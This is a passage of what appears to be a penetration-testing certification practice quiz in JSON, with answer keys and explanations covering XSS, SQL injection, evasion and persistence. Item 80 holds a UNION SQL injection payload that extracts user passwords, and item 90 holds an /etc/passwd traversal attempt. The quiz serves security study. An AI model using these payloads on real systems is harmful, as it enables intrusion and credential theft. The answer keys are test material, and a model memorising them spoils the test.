          "examTip": "OSINT (public websites, social media, specialized tools) = Reconnaissance."
        },
        {
            "id": 74,
             "question": "Which of the following is a common technique used to prevent 'cross-site scripting' (XSS) attacks?",
             "options":[
                "Using weak passwords for user accounts.",
                "Implementing proper input validation (to reject or sanitize potentially malicious input) and output encoding (to convert special characters into their corresponding HTML entities or other appropriate encoding for the context), and using a Content Security Policy (CSP).",
                "Disabling firewalls to allow all network traffic.",
                "Ignoring user input and assuming it is safe."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Input validation and output encoding are crucial defenses against XSS. Input validation checks and sanitizes user-supplied data *before* it's processed or stored. Output encoding ensures that any data displayed to the user is treated as *data*, not as executable code, by the browser. A Content Security Policy (CSP) provides an additional layer of defense by controlling which resources the browser is allowed to load. Weak passwords, disabling firewalls, and ignoring input are all security risks.",
             "examTip": "Input validation + output encoding + CSP = Strong XSS defense."
        },
        {
            "id": 75,
            "question": "What is the primary purpose of 'fuzzing' in software testing and security analysis?",
            "options":[
              "To encrypt data transmitted between a client and a server.",
              "To provide a program or application with invalid, unexpected, or random data as input, with the goal of identifying vulnerabilities, crashes, or other unexpected behavior that could be exploited by attackers.",
              "To crack user passwords using a combination of dictionary words and brute-force techniques.",
              "To manage user accounts and permissions on a system or network."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Fuzzing is a dynamic testing technique that involves feeding a program with 'bad' data to find bugs and vulnerabilities. It's not encryption, password cracking, or user management.",
            "examTip": "Fuzzing = Testing with invalid/unexpected/random input to find vulnerabilities."
        },
        {
            "id": 76,
             "question":"What is 'SQL injection' (SQLi)?",
             "options":[
                "A type of social engineering attack where an attacker impersonates a database administrator.",
                "An attack technique used to exploit web applications (or other applications that interact with a database) that construct SQL statements based on user input. Attackers can inject malicious SQL code into input fields to bypass authentication, access, modify, or delete data in the database, or even execute commands on the database server.",
                "A method for encrypting data stored in a database to protect it from unauthorized access.",
                "A technique for improving the performance of database queries."
             ],
             "correctAnswerIndex": 1,
             "explanation": "SQL injection targets vulnerabilities in how applications handle user input when constructing database queries. It allows attackers to inject their own SQL code, potentially gaining control over the database. It's not a social engineering attack, an encryption method, or a performance optimization technique.",
             "examTip": "SQL injection = Injecting malicious SQL code into database queries."
        },
        {
            "id": 77,
            "question": "Which of the following is a common technique for bypassing Network Access Control (NAC) systems?",
            "options":[
              "Using strong passwords for all user accounts.",
              "MAC spoofing, 802.1X authentication bypass (if vulnerabilities exist), exploiting vulnerabilities in the NAC system itself, or using a VPN to tunnel traffic around the NAC.",
              "Enabling two-factor authentication for all user accounts.",
              "Regularly updating software on all network devices."
            ],
            "correctAnswerIndex": 1,
            "explanation": "MAC spoofing (changing a device's MAC address to match an authorized one), 802.1X bypass (if vulnerabilities exist), directly attacking the NAC system, or using a VPN to circumvent it are all methods for bypassing NAC. Strong passwords, 2FA, and updates are good security practices but don't directly address NAC bypass.",
            "examTip": "MAC spoofing, 802.1X bypass, NAC exploits, VPN tunneling = Bypassing NAC."
        },
        {
            "id": 78,
             "question": "What is the purpose of 'code review' in the context of application security?",
             "options":[
                "To test the performance and scalability of an application under heavy load.",
                "To manually inspect the source code of an application to identify security vulnerabilities, coding errors, and violations of secure coding best practices.",
                "To encrypt the application's source code to protect it from unauthorized access.",
                "To document the functionality and features of an application for users and developers."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Code review is a systematic examination of source code, looking for security flaws, bugs, and adherence to secure coding standards. It's a *manual* process, distinct from automated testing. It's not about performance testing, encryption, or general documentation.",
             "examTip": "Code review = Manual inspection of source code for security vulnerabilities."
        },
         {
            "id": 79,
           "question": "Which of the following is a common method for performing a 'man-in-the-middle' (MitM) attack?",
           "options":[
                "Sending phishing emails to a large number of recipients.",
                "Using techniques like ARP poisoning (on wired networks), creating a rogue access point (evil twin) on wireless networks, DNS spoofing, SSL/TLS stripping, or exploiting vulnerabilities in network protocols to intercept, monitor, and potentially modify network traffic between two parties.",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force or dictionary attack."
           ],
           "correctAnswerIndex": 1,
           "explanation": "MitM attacks involve intercepting communication. ARP poisoning redirects traffic on wired networks, rogue access points (evil twins) do the same on wireless networks, DNS spoofing redirects DNS requests, and SSL/TLS stripping downgrades secure connections. Protocol vulnerabilities can also be exploited. Phishing is a social engineering technique, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
           "examTip": "ARP poisoning (wired), rogue AP (wireless), DNS spoofing, SSL stripping, protocol exploits = MitM techniques."
        },
        {
           "id": 80,
           "question": "Examine the following Burp Suite Repeater request and response:\n**Request:**\n```\nGET /product.php?id=1 HTTP/1.1\nHost: example.com\n```\n**Response:**\n```\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n... product details for product ID 1 ...\n```\n**Modified Request:**\n```\nGET /product.php?id=1 AND 1=0 UNION SELECT username, password FROM users HTTP/1.1\nHost: example.com\n```\n**Response:**\n```\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n... product details ... admin, xxxxxxx ...\n```\nWhat type of attack was attempted, and what does the response indicate?",
           "options":[
            "Cross-Site Scripting (XSS) attack; unsuccessful.",
            "SQL Injection (SQLi) attack; successful.",
            "Cross-Site Request Forgery (CSRF) attack; unsuccessful.",
            "Denial-of-Service (DoS) attack; unsuccessful."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The modified request includes a clear SQL injection payload: `AND 1=0 UNION SELECT username, password FROM users`. The attacker is attempting to inject a `UNION` statement to retrieve data from the `users` table (specifically, usernames and passwords). The `200 OK` response, and the fact that 'admin, xxxxxxx' appears in the response body, *strongly* suggest that the attack was *successful* and the attacker was able to extract data from the database. This is a classic example of a Union-based SQL injection. It's not XSS (no script injection), CSRF (no forced user actions), or DoS (no disruption of service).",
           "examTip": "SQL `UNION` in a request parameter, and sensitive data in the response = Successful SQLi."
        },
        {
           "id": 81,
            "question": "Which of the following is a common technique for discovering hidden files and directories on a web server during the reconnaissance phase?",
            "options":[
              "Shoulder surfing.",
              "Using tools like DirBuster, Gobuster, ffuf, or performing directory brute-forcing/dictionary attacks; analyzing the web application's source code (HTML, JavaScript) and `robots.txt` for clues; and checking for common file and directory names (e.g., admin/, backup/, test/).",
              "Phishing.",
              "Social engineering."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Directory brute-forcing/dictionary attacks, combined with analyzing source code and checking `robots.txt`, are common and effective methods for finding unlinked or hidden web content. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
            "examTip": "Directory brute-forcing, source code analysis, `robots.txt` = Finding hidden web content."
        },
         {
            "id": 82,
             "question": "What is the primary purpose of 'input validation' in web application security?",
             "options":[
                "To make web pages load faster by reducing the amount of data transmitted.",
                "To check and sanitize user-supplied data to ensure it conforms to expected formats, lengths, and types, and to prevent injection attacks (like SQL injection and cross-site scripting) and other vulnerabilities that exploit malformed or malicious input.",
                "To encrypt user passwords before storing them in a database.",
                "To improve the visual design and user interface of a web application."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Input validation is a fundamental security control to prevent a wide range of attacks, especially injection attacks. It ensures that user-provided data is safe *before* it's processed by the application. It's not primarily about website speed, password encryption, or visual design.",
             "examTip": "Input validation = Checking and sanitizing user input to prevent injection attacks."
        },
        {
           "id": 83,
           "question": "What is a common method for an attacker to maintain persistence on a compromised Windows system?",
           "options":[
                "Regularly updating the operating system and all installed software.",
                "Creating a scheduled task, modifying the registry (e.g., Run keys, RunOnce keys, Services), using WMI event subscriptions, performing DLL hijacking, or installing a rootkit.",
                "Using a strong, unique password for the administrator account.",
                "Enabling the Windows Firewall and ensuring it is properly configured."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Persistence mechanisms ensure that an attacker can regain access even after reboots or user logouts. Scheduled tasks, registry modifications, malicious services, WMI event subscriptions, DLL hijacking, and rootkits are all common techniques. Updating the OS, using strong passwords, and enabling the firewall are *defensive* measures.",
           "examTip": "Scheduled tasks, registry keys, services, WMI, DLL hijacking, rootkits = Persistence on Windows."
        },
        {
           "id": 84,
            "question":"What is 'clickjacking'?",
            "options":[
             "A type of denial-of-service attack that makes a web server unavailable to legitimate users.",
             "A technique where an attacker tricks a user into clicking something different from what the user perceives they are clicking, often by using hidden or transparent iframes, layers, or other UI elements on a web page. This can lead to unintended actions, such as liking a page on social media, making a purchase, or even changing account settings.",
             "A method for encrypting web traffic between a client and a server using SSL/TLS.",
             "A technique for cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Clickjacking is a UI-based attack that deceives users into clicking on something they don't intend to, often by manipulating the visual presentation of a web page. It's not a DoS attack, an encryption method, or a password cracking technique.",
            "examTip": "Clickjacking = Tricking users into clicking hidden or disguised elements."
        },
        {
          "id": 85,
          "question": "Which of the following is a common method for an attacker to escalate privileges on a Linux system after gaining initial access?",
          "options":[
            "Sending phishing emails to users on the system.",
            "Exploiting vulnerabilities in SUID binaries, misconfigured services (e.g., weak permissions, exposed daemons), or kernel vulnerabilities; also, leveraging weak or reused passwords, or exploiting vulnerabilities in running applications.",
            "Performing a denial-of-service attack against the system.",
            "Cracking passwords using a brute-force attack against the root account."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Privilege escalation on Linux often involves exploiting vulnerabilities in programs that run with elevated privileges (like SUID binaries), misconfigured services, or kernel vulnerabilities. Weak passwords and application vulnerabilities can also be leveraged. Phishing is typically used for *initial access*, not privilege escalation. DoS attacks disrupt service, and brute-forcing the root account directly is often impractical due to account lockouts.",
          "examTip": "SUID binaries, misconfigured services, kernel vulnerabilities, weak passwords = Linux privilege escalation."
        },
        {
            "id": 86,
            "question": "You are performing a penetration test and are trying to identify the version of a specific service running on a remote host. Which Nmap option is specifically designed for this purpose?",
            "options":[
              "-sS",
              "-sV",
              "-O",
              "-p-"
            ],
            "correctAnswerIndex": 1,
            "explanation": "The `-sV` option in Nmap enables service version detection. Nmap sends probes to open ports and analyzes the responses to determine the specific software and version running on those ports. `-sS` is a TCP SYN scan (stealth scan), `-O` is for OS detection, and `-p-` scans all 65535 ports.",
            "examTip": "Nmap `-sV` = Service version detection."
        },
        {
            "id": 87,
            "question": "What is the primary goal of 'post-exploitation' activities during a penetration test?",
            "options":[
               "To gather information about the target system *before* compromising it.",
               "After successfully compromising a system or network, to maintain access (persistence), escalate privileges, move laterally within the network, gather additional information (e.g., sensitive data, credentials), and achieve the attacker's objectives (within the ethical and legal boundaries of the engagement).",
               "To write a detailed report about the findings of the penetration test.",
               "To plan the penetration testing engagement and define the scope of work."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Post-exploitation is everything that happens *after* initial access is gained. It's about expanding control, maintaining access, and achieving the objectives of the penetration test (which are defined in the scope, and *never* include unauthorized data theft or damage). Information gathering (reconnaissance) and planning happen *before* exploitation. Report writing is a separate phase.",
            "examTip": "Post-exploitation = Actions *after* gaining initial access (persistence, privilege escalation, lateral movement, data gathering)."
        },
        {
            "id": 88,
            "question": "What is 'data exfiltration'?",
            "options":[
               "The process of encrypting sensitive data to protect it from unauthorized access.",
               "The unauthorized transfer of data from a compromised system or network to a location under the attacker's control.",
               "The process of backing up data to a secure location to prevent data loss.",
               "The process of securely deleting data from a system to prevent it from being recovered."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Data exfiltration is the unauthorized removal or theft of data from a system or network. It's not encryption, backup, or secure deletion.",
            "examTip": "Data exfiltration = Stealing data from a compromised system."
        },
        {
           "id": 89,
            "question": "Which of the following is a common technique for bypassing web application firewalls (WAFs)?",
            "options":[
                "Using strong, unique passwords for all user accounts.",
                "Using techniques like character encoding (e.g., URL encoding, HTML encoding), obfuscation (e.g., using different SQL keywords, inserting comments), HTTP parameter pollution, case manipulation, and exploiting vulnerabilities in the WAF itself.",
                "Enabling HTTPS for all web traffic.",
                "Regularly updating the web application's software and dependencies."
            ],
            "correctAnswerIndex": 1,
            "explanation": "WAFs often rely on pattern matching and rules to identify and block malicious requests. Attackers can try to bypass these rules by encoding or obfuscating their payloads, making them look different from known attack signatures.  HTTP parameter pollution (sending multiple parameters with the same name) can also sometimes confuse WAFs. Strong passwords, HTTPS, and updates are good security practices, but they don't directly address WAF evasion. Exploiting WAF vulnerabilities is a more advanced technique.",
            "examTip": "Encoding, obfuscation, parameter pollution, WAF exploits = WAF evasion techniques."
        },
                {
          "id": 90,
          "question": "Examine the following log snippet from a web server:\n```\n192.168.1.100 - - [29/Aug/2024:15:45:10 -0400] \"GET /index.php?id=1 HTTP/1.1\" 200 3456 \"-\" \"Mozilla/5.0\"\n192.168.1.100 - - [29/Aug/2024:15:45:11 -0400] \"GET /index.php?id=2 HTTP/1.1\" 200 3482 \"-\" \"Mozilla/5.0\"\n192.168.1.100 - - [29/Aug/2024:15:45:12 -0400] \"GET /index.php?id=3 HTTP/1.1\" 200 3415 \"-\" \"Mozilla/5.0\"\n192.168.1.100 - - [29/Aug/2024:15:45:13 -0400] \"GET /index.php?id=../../../etc/passwd HTTP/1.1\" 403 129 \"-\" \"Mozilla/5.0\"\n```\nWhat type of attack is MOST likely being attempted, and what is the likely outcome based on the log entries?",
          "options":[
            "Cross-Site Scripting (XSS); unsuccessful.",
            "Local File Inclusion (LFI) / Directory Traversal; unsuccessful.",
            "SQL Injection (SQLi); successful.",
            "Denial-of-Service (DoS); unsuccessful."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The request with `id=../../../etc/passwd` is a clear attempt at a Local File Inclusion (LFI) or Directory Traversal attack. The attacker is trying to navigate outside the web root directory to access the `/etc/passwd` file on the server. The `403 Forbidden` status code in the response indicates that the attack was *unsuccessful* (the server likely has protections in place to prevent this type of attack). The previous requests with `id=1`, `id=2`, and `id=3` and their `200 OK` responses likely represent normal application behavior. It's not XSS (no script injection), SQLi (no SQL code injection), or DoS (no disruption of service).",
          "examTip": "`../../../` in a URL parameter = Strong indicator of LFI/Directory Traversal attempt. 403 Forbidden = Likely blocked."
        },
        {
           "id": 91,
            "question": "You are performing a penetration test and successfully gain access to a user's workstation. Which of the following actions would be the MOST ethical and aligned with professional penetration testing practices?",
            "options":[
              "Immediately begin exfiltrating sensitive data from the workstation.",
              "Document the steps taken to gain access, assess the system for further vulnerabilities and potential for privilege escalation and lateral movement, and inform the client's designated contact according to the agreed-upon communication plan.",
              "Install a backdoor on the workstation to ensure persistent access.",
              "Modify system files to cover your tracks and prevent detection."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Ethical hacking requires responsible behavior and adherence to the agreed-upon scope and rules of engagement. Documenting the steps, assessing for further vulnerabilities, and communicating with the client are crucial. Exfiltrating data without explicit authorization, installing backdoors without permission, and modifying system files to hide activity are all unethical and potentially illegal.",
            "examTip": "Document, assess, and communicate after gaining access; unauthorized data exfiltration, backdoors, and covering tracks are unethical."
        },
        {
           "id": 92,
            "question": "Which of the following is a common method for performing reconnaissance on a target organization before launching a cyber attack?",
            "options":[
              "Exploiting vulnerabilities in the target's web server.",
              "Using OSINT (Open-Source Intelligence) techniques, such as searching public websites, social media, search engines, DNS records, WHOIS information, public code repositories, and other publicly available data sources; also using specialized tools like theHarvester, Maltego, Shodan, and Recon-ng.",
              "Performing a denial-of-service attack against the target's network.",
              "Cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Reconnaissance is about gathering information *before* launching any attacks. OSINT, which leverages publicly available data, is a fundamental part of reconnaissance. Exploiting vulnerabilities, DoS attacks, and password cracking are later attack stages.",
            "examTip": "OSINT (public websites, social media, specialized tools) = Reconnaissance."
        },
        {
            "id": 93,
            "question":"What is a common technique for bypassing a Network Intrusion Detection System (NIDS) or Intrusion Prevention System (IPS)?",
            "options":[
              "Using well-known and easily detectable attack signatures.",
              "Using techniques like packet fragmentation, IP address spoofing, traffic obfuscation (e.g., encoding, encryption, Unicode variations, inserting NOP sleds), using non-standard ports or protocols, and exploiting vulnerabilities in the NIDS/IPS itself.",
              "Sending very large, unfragmented packets with clearly malicious payloads.",
              "Using the default configuration settings for the NIDS/IPS."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Evasion techniques aim to make malicious traffic look different from known attack patterns or to bypass filtering rules. Fragmentation, spoofing, obfuscation, encryption, non-standard ports/protocols, and NIDS/IPS exploits can all help achieve this. Using known signatures, large unfragmented packets, and default settings would likely *trigger* the NIDS/IPS.",
            "examTip": "Fragmentation, spoofing, obfuscation, encryption, non-standard ports/protocols, NIDS/IPS exploits = Evasion techniques."
          },
          {
            "id": 94,
              "question": "What is the primary purpose of a 'reverse shell'?",
              "options":[
                "To encrypt network traffic between a client and a server.",
                "To establish a shell connection *from* a compromised target system *back* to an attacker-controlled machine, often bypassing firewall restrictions that might block incoming connections.",
                "To manage user accounts and permissions on a remote system.",
                "To improve the performance of a network connection."
              ],
              "correctAnswerIndex": 1,
              "explanation": "A reverse shell allows an attacker to gain remote control of a compromised system even if it's behind a firewall that blocks incoming connections. The *target* initiates the connection *out* to the attacker's listening machine. It's not primarily for encryption, user management, or performance improvement.",
              "examTip": "Reverse shell = Target connects *out* to attacker (bypasses firewall restrictions)."
          },
          {
            "id": 95,
             "question": "You are performing a penetration test and discover a web application that allows you to upload files with any extension, including `.php`, `.asp`, `.jsp`, and `.exe`.  You successfully upload a file named `shell.php` containing PHP code that executes system commands, and you can then access this file through a URL and execute those commands. What type of vulnerability have you successfully exploited, and what is the MOST severe potential consequence?",
             "options":[
                "Cross-Site Scripting (XSS); you can inject malicious scripts into web pages viewed by other users.",
                "Remote Code Execution (RCE); you can execute arbitrary commands on the web server, potentially gaining full control of the system.",
                "SQL Injection (SQLi); you can gain access to the web server's database and potentially steal or modify data.",
                "Denial-of-Service (DoS); you can make the web application unavailable to legitimate users."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Unrestricted file uploads that allow for the execution of server-side code (like PHP, ASP, JSP, or even executable files) lead to Remote Code Execution (RCE), one of the most critical vulnerabilities. This allows the attacker to run arbitrary commands on the server, potentially taking full control of it. XSS involves client-side script injection, SQLi targets databases, and DoS disrupts service availability.",
             "examTip": "Unrestricted file upload + server-side code execution (e.g., .php, .asp, .jsp, .exe) = RCE (very critical)."
          },
          {
            "id": 96,
             "question": "Which of the following is a common method for performing a 'man-in-the-middle' (MitM) attack?",
             "options":[
                "Sending phishing emails to a large number of recipients.",
                "Using techniques like ARP poisoning (on wired networks), creating a rogue access point (evil twin) on wireless networks, DNS spoofing, SSL/TLS stripping (downgrading HTTPS to HTTP), or exploiting vulnerabilities in network protocols to intercept, monitor, and potentially modify network traffic between two parties.",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force or dictionary attack."
             ],
             "correctAnswerIndex": 1,
             "explanation": "MitM attacks involve intercepting communication between two parties. ARP poisoning redirects traffic on wired networks, rogue access points (evil twins) do the same on wireless networks, DNS spoofing redirects DNS requests, and SSL/TLS stripping removes encryption.  Protocol vulnerabilities can also be exploited. Phishing is social engineering, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
             "examTip": "ARP poisoning (wired), rogue AP (wireless), DNS spoofing, SSL stripping, protocol exploits = MitM techniques."
          },
           {
            "id": 97,
            "question":"What is 'cross-site request forgery' (CSRF)?",
            "options":[
              "A type of denial-of-service attack that makes a web server unavailable to legitimate users.",
              "An attack that forces an authenticated end user to execute unwanted actions on a web application in which they are *currently logged in*, without their knowledge or consent. The attacker tricks the user's browser into sending a forged request to the vulnerable application, which the application treats as a legitimate request from the user.",
              "A method for encrypting web traffic between a client and a server using SSL/TLS.",
              "A technique for cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "CSRF exploits the trust a web application has in a logged-in user's browser. The attacker crafts a malicious request that the user's browser unknowingly sends to the vulnerable application. The application, seeing a valid session, executes the request as if it came from the user. It's not a DoS attack, an encryption method, or a password cracking technique.",
            "examTip": "CSRF = Forcing authenticated users to execute unintended actions."
           },
           {
             "id": 98,
             "question": "Which of the following is a common technique used to identify vulnerabilities in web applications?",
             "options":[
                 "Shoulder surfing.",
                  "Using a combination of automated web application vulnerability scanners (like Burp Suite, OWASP ZAP, Nikto, Acunetix), manual testing techniques (including input validation testing, session management testing, authentication testing, authorization testing, business logic testing, and parameter tampering), and, if available, source code review.",
                  "Phishing.",
                  "Social engineering."
             ],
             "correctAnswerIndex": 1,
             "explanation": "A comprehensive web application security assessment requires both automated scanning (for broad coverage and identifying common vulnerabilities) and manual testing (for in-depth analysis, finding logic flaws, and testing complex attack scenarios). Source code review, when possible, provides the deepest level of analysis. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
             "examTip": "Automated scanners + manual testing + code review = Comprehensive web application security assessment."
            },
            {
              "id": 99,
               "question": "You are performing a penetration test against a web application and discover that it's possible to inject HTML tags and JavaScript code into a user input field, and this injected code is then displayed to other users without any sanitization or encoding. What type of vulnerability have you found, and what is a potential consequence?",
               "options":[
                 "SQL Injection; you could gain access to the application's database.",
                 "Cross-Site Scripting (XSS); you could steal other users' cookies, redirect them to malicious websites, deface the website, or perform other actions in the context of their browsers.",
                 "Cross-Site Request Forgery (CSRF); you could force an authenticated user to perform unintended actions.",
                 "Denial-of-Service (DoS); you could make the website unavailable."
               ],
               "correctAnswerIndex": 1,
               "explanation": "The ability to inject HTML and JavaScript that is then displayed to other users is the hallmark of Cross-Site Scripting (XSS). This allows an attacker to execute arbitrary code in the context of other users' browsers, leading to various potential consequences. It's not SQL injection (which targets databases), CSRF (which forces unintended actions through legitimate-looking requests), or DoS (which disrupts service).",
               "examTip": "Injecting HTML/JavaScript that's displayed to other users = XSS."
            },
            {
                "id": 100,
                "question": "Analyze the following command:\n```bash\npython3 -m http.server 8000\n```\nAnd, given the context of a penetration test or red team engagement, what is a potential *malicious* use of this command on a *compromised* system?",
                "options":[
                    "This command is used to start a simple web server; it has no malicious uses.",
                    "This command is used to encrypt files on the system.",
                    "This command could be used to serve files (potentially exfiltrated data or tools) from the compromised system to the attacker, or to host a phishing page or malicious content.",
                    "This command is used to install a firewall on the system."
                ],
                "correctAnswerIndex": 2,
                "explanation": "`python3 -m http.server 8000` starts a very basic web server on port 8000, serving files from the current directory. While this command itself is *not* inherently malicious, on a *compromised* system, an attacker could use it to: (1) **Exfiltrate data:** Make stolen data easily accessible to themselves by placing it in the directory being served. (2) **Host tools:** Serve additional attack tools or scripts to other compromised systems on the network. (3) **Host phishing pages or malware:** Serve malicious content to unsuspecting users. It is *not* used for encryption or installing firewalls. The key here is the context: a legitimate command used for malicious purposes on a system the attacker controls.",
                "examTip": "Simple web servers (Python, etc.) on compromised systems = Potential data exfiltration or tool hosting."
            }
  ]
}
